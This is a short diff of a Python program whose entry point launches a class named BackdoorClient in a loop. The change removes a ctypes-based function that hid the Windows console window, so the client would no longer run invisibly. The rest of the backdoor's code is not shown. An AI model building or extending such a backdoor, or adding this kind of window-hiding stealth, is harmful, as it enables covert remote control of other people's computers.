@@ -1,7 +1,6 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 import os
-import ctypes
 import shlex
 from subprocess import Popen, PIPE
 import threading
@@ -328,15 +327,7 @@ def hostname():
         return 'Unknow hostname'
 
 
-def hide_cmd_window():
-    whnd = ctypes.windll.kernel32.GetConsoleWindow()
-    if whnd != 0:
-        ctypes.windll.user32.ShowWindow(whnd, 0)
-        ctypes.windll.kernel32.CloseHandle(whnd)
-
-
 if __name__ == '__main__':
-    hide_cmd_window()
     BackdoorClient()
     while True:
         time.sleep(10)
